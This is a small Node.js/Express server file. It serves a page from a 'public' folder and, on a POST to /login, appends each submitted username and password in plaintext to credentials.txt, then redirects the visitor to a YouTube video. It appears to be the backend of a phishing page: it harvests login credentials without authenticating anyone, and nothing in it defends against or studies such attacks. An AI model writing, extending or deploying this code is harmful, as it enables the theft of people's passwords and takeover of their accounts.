const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000; // Use environment port or default to 3000

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));  // Correct path for static files

// Serve the HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));  // Serve index.html
});

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const data = `Username: ${username}, Password: ${password}\n`;

    // Save to a file
    fs.appendFile('credentials.txt', data, (err) => {
        if (err) {
            console.error('Error saving data:', err);
            res.status(500).send('Internal Server Error');
        } else {
            // Redirect to YouTube video
            res.redirect('https://www.youtube.com/shorts/fKyz2FO-4BE');
        }
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
